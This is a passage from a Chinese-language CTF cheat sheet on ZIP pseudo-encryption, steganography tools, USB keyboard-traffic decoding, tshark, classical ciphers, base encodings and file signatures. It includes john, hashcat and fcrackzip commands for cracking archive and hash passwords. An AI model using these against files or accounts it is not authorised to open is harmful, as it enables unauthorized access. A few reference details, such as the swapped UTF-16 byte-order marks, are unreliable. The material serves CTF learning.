改为  00 00  就可以去除密码\n把压缩源文件目录区的全局方式位标记的  00 00  改为  01  00 或 09 00  就可以添加密码\n\n同时注意压缩源文件数据区全局方式位是否修改。\n# 工具局限性很大，建议手动修改。\njava -jar ZipCenOp.jar r test.zip\n\na.压缩源文件数据区50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本09 00：全局方式位标记（有无加密）08 00：压缩方式50 A3：最后修改文件时间A5 4A：最后修改文件日期21 38 76 64：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）08 00：文件名长度00 00：扩展记录长度\nb.压缩源文件目录区50 4B 01 02：目录中文件文件头标记(0x02014b50)1F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式50 A3：最后修改文件时间A5 4A：最后修改文件日期21 38 76 65：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）08 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量\nc.压缩源文件目录结束标志50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数5A 00 00 00：目录区尺寸大小3F 00 00 00：目录区对第一张磁盘的偏移量00 00 00：ZIP 文件注释长度\n识别真假加密\n无加密\n\n压缩源文件数据区的全局加密应当为00 00\n且压缩源文件目录区的全局方式位标记应当为00 00\n\n\n假加密\n\n压缩源文件数据区的全局加密应当为00 00\n且压缩源文件目录区的全局方式位标记应当为09 00\n\n\n真加密\n\n压缩源文件数据区的全局加密应当为09 00\n且压缩源文件目录区的全局方式位标记应当为09 00\n\n\n\njohn 破解压缩包密码zip2john 压缩包.zip &gt;&gt; 1.txt\n# rar2john 压缩包.rar &gt;&gt; 1.txt\njohn 1.txt\n# john john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt(设置字典) 1.txt\n\nJohn支持四种密码破解模式:1.字典模式:在这种模式下，用户只需要提供字典和密码列表用于破解。2.单一破解模式:这是john作者推荐的首选模式。John会使用登录名、全名和家庭通讯录作为候选密码。3.递增模式:在该模式下john会尝试所有可能的密码组合。这是最具威力的一种。4.外部模式:在这种模式下，用户可以使用john的外部破解模式。使用之前，需要创建一个名为(list.external : mode)的配置文件，其中mode由用户分配。\n一些常用命令:\njohn --wordlist&#x3D;passwords.txt hashed_passwords.txt：\n使用字典文件passwords.txt破解哈希密码文件hashed_passwords.txt。\n\njohn --format&#x3D;md5 --wordlist&#x3D;passwords.txt --rules&#x3D;password.rules hashed_passwords.txt：\n使用md5格式、字典文件passwords.txt和规则文件password.rules破解哈希密码文件hashed_passwords.txt。\n\njohn --show hashed_passwords.txt：显示已破解的密码。\n\njohn --incremental hashed_passwords.txt：使用增量模式破解密码。\n\njohn --status：显示当前会话的破解状态。\njohn --restore：恢复中断的会话。\njohn --list&#x3D;formats：列出可用的哈希格式。\njohn --list&#x3D;rules：列出可用的规则集。\n\njohn --single --wordlist&#x3D;passwords.txt hashed_passwords.txt：\n使用字典文件passwords.txt尝试破解哈希密码文件hashed_passwords.txt。\n\njohn --single --wordlist&#x3D;passwords.txt --rules&#x3D;password.rules hashed_passwords.txt：\n使用字典文件passwords.txt和规则文件password.rules尝试破解哈希密码文件hashed_passwords.txt。\n\njohn --single&#x3D;:rule --wordlist&#x3D;passwords.txt hashed_passwords.txt：\n使用指定的规则rule和字典文件passwords.txt尝试破解哈希密码文件hashed_passwords.txt。\n\njohn --single-pair-max&#x3D;4 --wordlist&#x3D;passwords.txt hashed_passwords.txt：\n使用字典文件passwords.txt生成最多4个单词对，并尝试破解哈希密码文件hashed_passwords.txt。\n\njohn --incremental hashed_passwords.txt ：\n用于使用递增模式(可以理解为真-暴力破解)尝试破解哈希密码。\n\nhashcat 结合 john 破解压缩包密码-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。\n-m  指定要破解的hash类型，如果不指定类型，则默认是MD5\n-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中\n--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项\n--show  显示已经破解的hash及该hash所对应的明文\n--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程\n--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用\n--increment-max  密码最大长度,同上\n--outfile-format 指定破解结果的输出格式id,默认是3\n--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到\n--remove     删除已被破解成功的hash\n-r       使用自定义破解规则\n\n使用字典破解zip加密文件的指令及输出如下：\nzip2john.exe test.zip &gt; test.txt  # 获取zip加密文件的Hash指令\nhashcat -a 0 -m 17210 test.txt password.txt --force # password.txt中存放密码字典\n\nfcrackzip 破解压缩包密码sudo apt-get install fcrackzip\n\n\n-v 显示实时爆破信息\n-b 暴力破解\n-D 字典破解\n-u 使用unzip命令去尝试\n-p 破解的起始位置\n-l 设置长度，3-3表示最小(3)到最大(3)，也就是限制了密码的长度（从提示.jpg知道密码为3位），\n-c 暴力破解的字符类型，1&#x3D;19, a&#x3D;az, A&#x3D;A~Z, !&#x3D;字符, :&#x3D;所有字符\n\nWindows 的 ARCHPR略\nstegslove 工具的利用stegsolve 的基本使用将图片导入，然后不停变换类型找二维码或者flag。\nstegsolve 解决 lsb 隐写\n\n\n\n\n\n\n\n\n用zsteg更直接\nLSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。\n对于LSB隐写的图片，我们用StegSolve打开图片，选择Data Extract模块，由于是RGB三原色的最低位隐写，提取Red，Green，和Blue的0通道信息，在这三个颜色的0通道上打勾，并按下Preview键。\n注意不同的文件头。\nstegsolve 将两张图片混合先用stegsolve打开其中一张，然后使用image combiner拼接，转换混合方式，得到二维码。\nzsteg 分析图片隐写安装zstegsudo su\napt-get update\napt-get intall gem\ngem install zsteg\n\nzsteg的用法用法: zsteg [选项] 文件名.png [参数字符串]\n\n-a, –all 尝试所有已知的隐写方法\n-E, –extract NAME 提取指定的Payload,NAME类似’1b,rgb,lsb’\n\n迭代&#x2F;提取参数:\n\n-o,\n–order X 设置像素迭代顺序(默认:’auto’)有效值:ALL,xy,yx,XY,YX,xY,Xy,bY等\n\n\n-c,\n–channels X 设置通道(R&#x2F;G&#x2F;B&#x2F;A)或任意组合,使用逗号分隔有效值:r,g,b,a,rg,bgr,rgba,r3g2b3等\n\n\n-b,\n–bits N 设置位数,单个整数或’1,3,5’范围’1-8’高级:指定单独位,如’00001110’或’0x88’\n–lsb 低位在前\n–msb 高位在前\n\n\n-P,\n–prime 只分析&#x2F;提取素数字节&#x2F;像素\n–shift N 在前面添加N个零位\n–invert 翻转位(异或0xff)\n–pixel-align 像素对齐隐写数据\n\n\n\n分析参数:\n\n-l,\n–limit N 限制检查字节数,0为无限(默认:256)\n–[no-]file 使用’file’检测数据类型(默认:YES)\n–no-strings 禁用ASCII字符串检索(默认:启用)\n\n\n-s,\n–strings X ASCII字符串模式:first,all,longest,none(默认:first)\n\n\n-n,\n–min-str-len X 最小字符串长度(默认:8)\n\n\n-v,\n–verbose 详细输出(可多次使用)\n\n\n-q,\n–quiet 静默警告(可多次使用)\n\n\n-C,\n–[no-]color 强制&#x2F;禁用颜色输出(默认:auto)\n\n\n\n参数快捷方式:\n\nzsteg fname.png 2b,b,lsb,xy &#x3D;&#x3D;&gt; –bits 2 –channel b –lsb –order xy\n\nzsteg实例使用\n尝试所有已知方法：\nzsteg -a filename.png\n\n提取指定的隐写载荷：\nzsteg -E 1b,rgb,lsb filename.png\n\n设置像素迭代顺序为xy，通道为红色和蓝色，使用3位和5位的位数：\nzsteg -o xy -c r,b -b 3,5 filename.png\n\n仅分析&#x2F;提取素数字节&#x2F;像素，设置最小字符串长度为10：\nzsteg -P -n 10 filename.png\n\n禁用ASCII字符串查找，使用最长模式：\nzsteg --no-strings -s longest filename.png\n\nconvert 分离 gif &amp;&amp; montage 图片拼接convert和montage命令都是Imagemagick软件包中的一部分。\n\nconvert命令可以将GIF文件分解成PNG图片。\nmontage命令可以拼接多个PNG图片。\n\n# 安装imagemagick\nsudo apt-get update\nsudo apt-get install imagemagick\n\n\n将GIF文件分解成PNG图片：\n\nconvert input.gif output-%d.png\n\n\n将多个PNG图片垂直拼接成一个大的PNG图片：\n\nmontage output*.png -tile x1 -geometry +0+0 flag.png\n\nconvert命令的基本用法convert [选项] [输入文件] [输出文件]\n\n\n[选项]：可以使用各种选项来控制转换和处理的方式。\n-resize &lt;宽度&gt;x&lt;高度&gt;\n调整图像的大小。\n\n\n-rotate &lt;角度&gt;\n旋转图像。\n\n\n-crop &lt;宽度&gt;x&lt;高度&gt;+&lt;X偏移&gt;+&lt;Y偏移&gt;\n裁剪图像。\n\n\n-flip\n垂直翻转图像。\n\n\n-flop\n水平翻转图像。\n\n\n-format &lt;格式&gt;\n指定输出文件的格式。\n\n\n\n\n[输入文件]：指定要转换或处理的输入图像文件。\n[输出文件]：指定生成的输出图像文件。\n\nmontage命令的基本用法montage [输入文件] [选项] [输出文件]\n\n\n[输入文件]：指定要拼接的图像文件列表，可以使用通配符来匹配多个文件。\n例如，image1.png image2.png 或  *.png。\n\n\n[选项]：可以使用各种选项来控制拼接的方式和结果。\n-tile &lt;列数&gt;x&lt;行数&gt;：指定拼接后的图像的布局。\n例如 -tile 2x2 表示两列两行。\n\n\n-geometry &lt;宽度&gt;x&lt;高度&gt;+&lt;X偏移&gt;+&lt;Y偏移&gt;: 指定每个输入图像的大小和位置。\n&lt;宽度&gt;x&lt;高度&gt; 表示每个图像的尺寸，\n+&lt;X偏移&gt;+&lt;Y偏移&gt; 表示每个图像的位置偏移量。\n\n\n\n\n[输出文件]：指定生成的拼接图像的文件名。\n\n其他一些文件格式的隐写mp3文件private bit隐写\n\n\n\n\n\n\n\n\nMP3文件private bit隐写技术是利用MP3文件私有位来隐藏信息的一种隐写方法。\n\n在MP3文件头部隐写:MP3文件头部包含诸如版本号、层数、采样率、位率等信息,这部分信息量较大,可以隐藏较长的秘密信息。隐写信息可以隐藏在帧同步字、版权标志、原始音频标志等字段中。\n在MP3帧头隐写:每个MP3帧头包含11字节的信息,可以隐藏约33位的信息。隐写信息可以隐藏在帧同步字、MPEG音频版本号、层、错误保护等字段中。\n在MP3频域中隐写:通过修改MP3频谱来隐藏信息,如最低有效位编码、相位编码、频率映射等方法。这种方法对音质的影响较小,但是隐藏信息量也较小。\n在MP3时间域中隐写:通过调制MP3音频样本值来隐藏信息,如最小有效位调制、相位调制等方法。这种方法可以隐藏更多信息,但是对音质的影响也较大。\n结合MP3压缩特点隐写:利用MP3压缩过程中产生的冗余度来隐藏信息。如在Huffman编码表中隐写、在SCALEFACTOR的四舍五入部分隐写等。这类方法对音质的影响很小,但是隐藏信息量也较小。\n\n\n\n\n名称\n长度(bit)\n作用\n\n\n\nsyncword\n12\n同步头，表示一帧数据的开始，共12位，全1即0XFFF\n\n\nID\n1\n算法标识位，”1”表示MPEG音频\n\n\nlayer\n2\n用来说明是哪一层编码\n\n\nprotection_bit\n1\n用来表明冗余信息是否被加到音频流中，以进行错误检测和错误隐蔽。”1”是未增加”0”是增加\n\n\nbitrate_index\n4\n用来指示该帧的bitrate\n\n\nsampling_frequency\n2\n用来指示采样频率\n\n\npadding_bit\n1\n如果该位为1，那么帧中包含一个额外槽，用于把平均位率调节到采样频率，否则该位必须为0。(是否对未填满的帧进行补齐)\n\n\nprivate_bit\n1\n留做私用\n\n\nmode\n2\n定义通道模式\n\n\nmode_extension\n2\n用来标识采用了哪一种joint_stereo\n\n\ncopyright\n1\n表明版权用，“1”表示有版权，“0”表示没有版权。\n\n\noriginal&#x2F;home\n1\n表明原版还是复制，“1”表示原版，“0”表示复制。\n\n\nemphasis\n2\n表明加重音类型\n\n\n脚本：\nimport re\nimport binascii\nn &#x3D; 235986              #第一个private bit起始位置\nresult &#x3D; &#39;&#39;\nfina &#x3D; &#39;&#39;\nnumber &#x3D; 0\nlist &#x3D; [0,1,26,50,75,99,124,148,173,197,222,246,271,295,320,344,369,393,418]     \n#组大小为417\nfile &#x3D; open(&#39;1.mp3&#39;,&#39;rb&#39;)        #rb是读取二进制文件\nwhile n &lt; 1369844 :      #已经可以结束的位置，可以发现后面private_bit的值都为0\n    file.seek(n,0)              #文件游标移动到n\n    if number in list:\n        n +&#x3D; 417\n    else:\n        n +&#x3D; 418\n    file_read_result &#x3D; file.read(1)      #读取一个字节\n    read_content &#x3D; bin(ord(file_read_result))[-1]   \n    #ord返回对应数字 bin用二进制表示  最后一位返回的是值\n    result &#x3D; result + read_content\n    number +&#x3D; 1\n#print result\n\nfina &#x3D; &#39;&#39;\ntextArr &#x3D; re.findall(&#39;.&#123;&#39;+str(8)+&#39;&#125;&#39;, result)    \n#在字符串result中匹配长度为8的字符串为一组并返回列表\nfor i in textArr:\n    fina &#x3D; fina + chr(int(i,2)).strip(&#39;\\n&#39;)         #返回字符\nprint (fina)\n\nword 隐写\nCtrl + A （白色字体）\n字体 &gt; 隐藏\n\n利用 audacity 解决音频隐写# 安装audacity\nsudo apt-get install audacity\n\n\n摩斯密码（波形谱）\n频谱图\n\nusb 流量分析\n八字节 为键盘流量\n四字节 为鼠标流量\n\ntshark -r &#39;.\\12.pcapng&#39; -T fields -e usb.capdata &gt; test.txt\n# -T fields: 指定输出格式为字段列表。\n# -e usb.capdata: 指定要输出的字段是usb.capdata,即USB数据包的有效数据部分。\n\n分析键盘数据脚本：\nnormalKeys &#x3D; &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;&#x3D;&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;&#x2F;&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;\n \nshiftKeys &#x3D; &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;\nnums &#x3D; []\nkeys &#x3D; open(&#39;1.txt&#39;) # 你导出的数据文档\nfor line in keys:\n    # print(line)\n    if len(line)!&#x3D;17: # 首先过滤掉鼠标等其他设备的USB流量\n         continue\n    nums.append(line[0:2]+line[4:6]) # 取一、三字节\n    # print(nums)\nkeys.close()\noutput &#x3D; &quot;&quot;\nfor n in nums:\n    if n[2:4] &#x3D;&#x3D; &quot;00&quot; :\n        continue\n    if n[2:4] in normalKeys:\n        if n[0:2]&#x3D;&#x3D;&quot;02&quot;: # 表示按下了shift\n            output +&#x3D; shiftKeys [n[2:4]]\n        else :\n            output +&#x3D; normalKeys [n[2:4]]\n    else:\n        output +&#x3D; &#39;[unknown]&#39;\nprint(&#39;output :&#39; + output)\n\ntshark 的用法\n\n\n\n\n\n\n\n\n最好不要用root用户使用tshark。\n\n捕获实时网络数据包tshark -i eth0(eth0是接口名称,可以换成其他接口)\n读取pcap文件tshark -r packet.pcap\n指定数据包过滤条件tshark -f “tcp port 80”   (只捕获目标端口是80的TCP数据包)\n指定输出格式tshark -T fields -e frame.time -e eth.src -e ip.src (输出特定的字段)tshark -T json (输出json格式)\n保存捕获的数据包tshark -w output.pcap\n统计数据包信息tshark -z io,phs (统计每秒数据包数)tshark -z conv,tcp (统计TCP会话信息)\n解码数据包tshark -d tcp.port&#x3D;&#x3D;8000,http (解码目标端口8000的http数据)\n读取数据包时设置过滤条件tshark -r packet.pcap -Y “http.request” (只读取HTTP请求数据包)\n\n一些编码与加密方式HTML 实体编码\n\n\n\n\n\n\n\n\nhttps://www.w3school.com.cn/html/html_charset.aspHTML 实体是一段以连字号(&amp;)开头、以分号(;)结尾的文本(字符串)。\n&lt;!-- 例如 --&gt;\n&amp;#x66;&amp;#x6c;&amp;#x61;&amp;#x67;&amp;#x7b;&amp;#x68;&amp;#x30;&amp;#x77;\n&amp;#x5f;&amp;#x34;&amp;#x62;&amp;#x6f;&amp;#x75;&amp;#x54;&amp;#x5f;&amp;#x65;\n&amp;#x6e;&amp;#x63;&amp;#x30;&amp;#x64;&amp;#x65;&amp;#x5f;&amp;#x34;\n&amp;#x6e;&amp;#x64;&amp;#x5f;&amp;#x70;&amp;#x6e;&amp;#x47;&amp;#x7d;\n\nflag&#123;h0w_4bouT_enc0de_4nd_pnG&#125;\n\nbase64 命令行编码和解码\n\n\n\n\n\n\n\n\nLinux的命令行就可以完成\n\nbase64编码（1）base64 file功能：从指定的文件file中读取数据，编码为base64的字符串然后输出；（2）echo “string” | base64功能：将字符串string+换行编码为base64的字符串然后输出；（3）echo -n “string” | base64功能：将字符串string编码为base64的字符串然后输出；\nbase64解码（1）base64 -d file功能：从指定的文件file中读取已经过base64编码的数据，然后进行解码，并输出解码后的字符串；（2）echo “str” | base64 -d功能：对base64编码的字符串str和空行进行解码，然后将解码后的字符串输出；（3）echo -n “str” | base64 -d功能：对base64编码的字符串str进行解码，然后将解码后的字符串输出；\n\n01248 密码( 云影密码 )该密码又称为云影密码，使用 01248 四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28&#x3D;10，124&#x3D;7，18&#x3D;9，再用 1-&gt;26 表示 A-&gt;Z。\n特点：只有 01248\n解密脚本：\ndef decode(cipher):\n    charList &#x3D; [chr(i) for i in range(ord(&#39;A&#39;),ord(&#39;Z&#39;)+1)]\n    ret &#x3D; []\n    plaintext &#x3D; [i for i in cipher.split(&#39;0&#39;)]\n    for i in plaintext:\n        tmp &#x3D; 0\n        for j in range(len(i)):\n            tmp +&#x3D; int(i[j])\n        ret.append(charList[tmp-1])\n    return &#39;&#39;.join(ret)\ntest &#x3D; decode(&#39;密文&#39;)\nprint(test)\n\nAffine密码(仿射密码)仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。\n\n\n\n\n\n\n\n\n\nhttp://www.hiencode.com/affine.html\nbase家族base16 编码包含数字0-9以及大写字母ABCDEF\n不可能用到“&#x3D;”填充\nbase32 编码包含大写字母（A-Z）和数字234567\n有“&#x3D;”符号作为填充\nbase64 编码包含大写字母（A-Z）、小写字母（a-z）、数字0——9以及+&#x2F;\n有“&#x3D;”符号作为填充\nbase36 编码数字0–9 大写字母A–Z\nbase45 编码数字0-9 大写字母A-Z 符号 $%*+-.&#x2F;:\nbase58 编码123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\n\n相比 Base_64，Base_58 不使用数字 “0“，字母大写“O“，字母大写 “I“，和字母小写 “l“，以及 “+“ 和 “&#x2F;“ 符号，比Base64共减少6个字符，故称着Base58\nbase62 编码ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\n\nBase62使用了62个字符编码，包括0-9，a-z，A-Z。现在各个社交网站的短URL，基本都是用Base62来编码的\nbase85 编码$%()*+,-.&#x2F;0123456789:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_&#96;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~\n\nBase85 可用于在 XML 文件中存储二进制数据，相比 Base94 不带 !”#&amp;’&lt;&#x3D;&gt;\\ 这 9 个字符， 无需转义。\nbase91 编码ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;&#123;|&#125;~&#39;\n\n在94个可打印的ASCII字符（0x21-0x7e）中，以下三个字符被省略以构建base91字母表：-（破折号，0x2d）\\（反斜杠，0x5C）‘（撇号，0x27）\nbase92 编码!#$%&amp;&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~\n\n比 base91 多了一个 \\ ，比 Base94 少了 ‘ - 这 2 个字符。\nbase94 编码94个可打印的ASCII字符。\n培根密码只有A 和 B（或者两种不同的符号）组成不同的字母。\n\n\n\n字母\n编码\n字母\n编码\n字母\n编码\n\n\n\nA&#x2F;a\naaaaa\nB&#x2F;b\naaaab\nC&#x2F;c\naaaba\n\n\nD&#x2F;d\naaabb\nE&#x2F;e\naabaa\nF&#x2F;f\naabab\n\n\nG&#x2F;g\naabba\nH&#x2F;h\naabbb\nI&#x2F;i\nabaaa\n\n\nJ&#x2F;j\nabaab\nK&#x2F;k\nababa\nL&#x2F;l\nababb\n\n\nM&#x2F;m\nabbaa\nN&#x2F;n\nabbab\nO&#x2F;o\nabbba\n\n\nP&#x2F;p\nabbbb\nQ&#x2F;q\nbaaaa\nR&#x2F;r\nbaaab\n\n\nS&#x2F;s\nbaaba\nT&#x2F;t\nbaabb\nU&#x2F;u\nbabaa\n\n\nV&#x2F;v\nbabab\nW&#x2F;w\nbabba\nX&#x2F;x\nbabbb\n\n\nY&#x2F;y\nbbaaa\nZ&#x2F;z\nbbaab\n\n\n\n\n凯撒密码将字母表中的每个字母向后（或向前）移动固定的位数来进行加密。\nencodeURL 和 encodeURLComponent 的区别\nencodeURI()方法用于对整个URL进行编码，包括协议、域名、路径和查询参数等部分。它会将URL中的特殊字符（如空格、冒号、斜杠等）转换为它们的UTF-8编码值，但保留一些特殊字符（如冒号、斜杠、问号等），以保持URL的完整性。\nencodeURIComponent()方法则用于对URL中的特定部分进行编码，包括查询参数值等。与encodeURI()不同，它会将URL中的所有特殊字符都进行转义，以确保URL的完全正确性。这包括将保留字符（如冒号、斜杠、问号等）也进行编码。\n\nrabbit加密题目提示和兔子有关时使用。\nOoK加密brainfuck语言用&gt; &lt; + - . , [ ]八种符号来替换C语言的各种语法和命令：\n例如： +++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++\n\nook密码中有大量ook，加上一些符号； Ook! has only three distinct syntax elements: Ook. Ook? Ook!这种就是ook密码。\n\n\n\n\n\n\n\n\n\nhttps://www.splitbrain.org/services/ook\n常见的文件头和文件尾图片文件\nJPEG：文件头：FF D8 FF，文件尾：FF D9\nTGA：未压缩的前4字节：00 00 02 00，RLE压缩的前5字节：00 00 10 00 00\nPNG：文件头：89 50 4E 47 0D 0A 1A 0A，文件尾：AE 42 60 82\nGIF：文件头：47 49 46 38 39(37) 61，文件尾：00 3B\nBMP：文件头：42 4D\nTIFF (tif)：文件头：49 49 2A 00\nICO：文件头：00 00 01 00\nAdobe Photoshop (psd)：文件头：38 42 50 53\n\nOffice文件\nMS Word&#x2F;Excel (xls.or.doc)：文件头：D0 CF 11 E0\nMS Access (mdb)：文件头：53 74 61 6E 64 61 72 64 20 4A\nWordPerfect (wpd)：文件头：FF 57 50 43\nAdobe Acrobat (pdf)：文件头：25 50 44 46 2D 31 2E\napplication&#x2F;vnd.visio(vsd)：文件头：D0 CF 11 E0 A1 B1 1A E1\nEmail [thorough only] (eml)：文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A\nOutlook Express (dbx)：文件头：CF AD 12 FE C5 FD 74 6F\nOutlook (pst)：文件头：21 42 44 4E\nRich Text Format (rtf)：文件头：7B 5C 72 74 66\nTXT 文件(txt)：Unicode：FE FF，Unicode big endian：FF FE，UTF-8：EF BB BF，ANSI编码是没有文件头的\n\n压缩包文件\nZIP Archive (zip)：文件头：50 4B 03 04，文件尾：50 4B\nRAR Archive (rar)：文件头：52 61 72 21\n\n音频文件\nWave (wav)：文件头：57 41 56 45\naudio(Audio)：文件头：4D 54 68 64\naudio&#x2F;x-aac（aac）：文件头：FF F1(9)\n\n视频文件\nAVI (avi)：文件头：41 56 49 20\nReal Audio (ram)：文件头：2E 72 61 FD\nReal Media (rm)：文件头：2E 52 4D 46\nMPEG (mpg)：文件头：00 00 01 